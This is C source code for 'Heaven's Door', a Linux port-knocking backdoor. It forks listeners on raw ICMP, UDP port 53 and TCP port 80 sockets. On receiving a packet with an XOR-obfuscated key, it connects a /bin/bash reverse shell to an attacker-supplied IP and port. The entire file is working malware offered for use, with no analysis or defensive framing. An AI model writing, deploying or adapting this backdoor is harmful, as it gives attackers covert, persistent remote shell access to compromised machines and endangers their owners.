/* Heaven's Door
 *
 * Port-knocking backdoor using ICMP and UDP protocol
 * Author: F0rb1dd3n
 *
 * Would you like to knock knock on heavens door?
 *
 */

#include <stdio.h>
#include <sys/types.h> 
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <netdb.h>
#include <unistd.h>
#include <ctype.h>
#include <netinet/in.h>
#include <netinet/in_systm.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <signal.h>

#define KEY		"F0rb1dd3n"
#define MOTD 		"\n\t\e[00;31mWellcome to F0rb1dd3n's sensual reverse shell!\n\n"
#define PACKET_SIZE 	1024
#define UDPPORT		53
#define TCPPORT		80

void reverse_shell(char *host, int port){
        int sockfd;
        struct hostent *host_info;
        struct sockaddr_in target_addr;
        char *arg[] = {"/bin/bash", NULL};

        if((host_info = gethostbyname(host)) == NULL)
                exit(-1);

        target_addr.sin_family = AF_INET;
        target_addr.sin_port = htons(port);
        target_addr.sin_addr = *((struct in_addr *)host_info->h_addr);
        memset(&(target_addr.sin_zero), '\0', 8); 

        if ((sockfd = socket(PF_INET, SOCK_STREAM, 0)) == -1)
                exit(-1);

        if (connect(sockfd, (struct sockaddr *)&target_addr, sizeof(struct sockaddr)) == -1)
                exit(-1);

        send(sockfd, MOTD, strlen(MOTD), 0);
        dup2(sockfd, 0);
        dup2(sockfd, 1);
        dup2(sockfd, 2);
        execve("/bin/bash", arg, NULL);
	close(sockfd);
}

void s_xor(char *arg, int key, int nbytes) {
	int i;
	for(i = 0; i < nbytes; i++) arg[i] ^= key;
}

void icmp_listener(void){
	int sockfd, n, ksize;
	char buf[PACKET_SIZE + 1], key[] = KEY;
    	struct ip *ip;
	struct icmp *icmp;

	ksize = strlen(KEY);
	s_xor(key, 11, ksize);
    	
	if((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP)) == -1) exit(-1);
	
	while(1){
        	bzero(buf, PACKET_SIZE + 1);        
        	n = recv(sockfd, buf, PACKET_SIZE, 0);
		if(n > 0){    
            		ip = (struct ip *)buf;
            		icmp = (struct icmp *)(ip + 1);
            
            		if((icmp->icmp_type == ICMP_ECHO) && (memcmp(icmp->icmp_data, key, ksize) == 0)){
                		char *attacker_ip, *data = (char *) malloc(ksize+24);
                		int attacker_port = 0;

				bzero(data, ksize+24);
				memcpy(data, icmp->icmp_data, ksize+24);
			
				s_xor(data, 11, strlen(data));
				
				strtok(data, " ");
				attacker_ip = strtok(NULL, " ");
				attacker_port = atoi(strtok(NULL, " "));
                		
				if((attacker_port <= 0) || (strlen(attacker_ip) < 7)){
					continue;
				} else {
                			if(fork() == 0){
						reverse_shell(attacker_ip, attacker_port);
                    				exit(EXIT_SUCCESS);
                			}
				}
				free(data);
            		}		
        	}
	}
}

void udp_listener(void) {
	int sockfd, n, ksize;
	char buf[PACKET_SIZE + 1], key[] = KEY;
	struct ip *ip;
	struct udphdr* udp;
	
	ksize = strlen(KEY);
	s_xor(key, 11, ksize);

	if((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_UDP)) == -1) exit(-1);

	while(1){
		bzero(buf, PACKET_SIZE + 1);
		n = recv(sockfd, buf, PACKET_SIZE, 0);
		if(n > 0){
			ip = (struct ip *)buf;
			udp = (struct udphdr *)(ip + 1);
			
			if((udp->dest == htons(UDPPORT)) && (strstr(buf, key) == 0)){
                		char *attacker_ip, *data = (char *) malloc(ksize+24);
                		int attacker_port = 0;

				bzero(data, ksize+24);
				memcpy(data, buf + sizeof(struct iphdr) + sizeof(struct udphdr), ksize+24);

				s_xor(data, 11, strlen(data));
			
				strtok(data, " ");
				attacker_ip = strtok(NULL, " ");
				attacker_port = atoi(strtok(NULL, " "));
                		
				if((attacker_port <= 0) || (strlen(attacker_ip) < 7)){
					continue;
				} else {
                			if(fork() == 0){
						reverse_shell(attacker_ip, attacker_port);
                    				exit(EXIT_SUCCESS);
                			}
				}		
				free(data);		
			}
		}
	}
}

void tcp_listener(void) {
	int sockfd, n, ksize;
	char buf[PACKET_SIZE + 1], key[] = KEY;
	struct ip *ip;
	struct tcphdr* tcp;
	
	ksize = strlen(KEY);
	s_xor(key, 11, ksize);

	if((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1) exit(-1);

	while(1){
		bzero(buf, PACKET_SIZE + 1);
		n = recv(sockfd, buf, PACKET_SIZE, 0);
		if(n > 0){
			ip = (struct ip *)buf;
			tcp = (struct tcphdr *)(ip + 1);
			
			if((tcp->dest == htons(TCPPORT)) && (strstr(buf, key) == 0)){
                		char *attacker_ip, *data = (char *) malloc(ksize+24);
                		int attacker_port = 0;

				bzero(data, ksize+24);
				memcpy(data, buf + sizeof(struct iphdr) + sizeof(struct tcphdr), ksize+24);

				s_xor(data, 11, strlen(data));
			
				strtok(data, " ");
				attacker_ip = strtok(NULL, " ");
				attacker_port = atoi(strtok(NULL, " "));
                		
				if((attacker_port <= 0) || (strlen(attacker_ip) < 7)){
					continue;
				} else {
                			if(fork() == 0){
						reverse_shell(attacker_ip, attacker_port);
                    				exit(EXIT_SUCCESS);
                			}
				}		
				free(data);		
			}
		}
	}
}

int main(int argc, char *argv[]){ 
   	pid_t pid;
	
	signal(SIGCLD, SIG_IGN); 
    	chdir("/");

	pid = fork();

	if(pid == -1) exit(-1);
	
	if(pid == 0) icmp_listener();

	if(pid > 0) {
		pid = fork();

		if(pid == -1) exit(-1);

		if(pid == 0) udp_listener();
	
		if(pid > 0) {
			pid = fork();
		
			if(pid == -1) exit(-1);

			if(pid == 0) tcp_listener();
		}
	}

	return EXIT_SUCCESS;
}
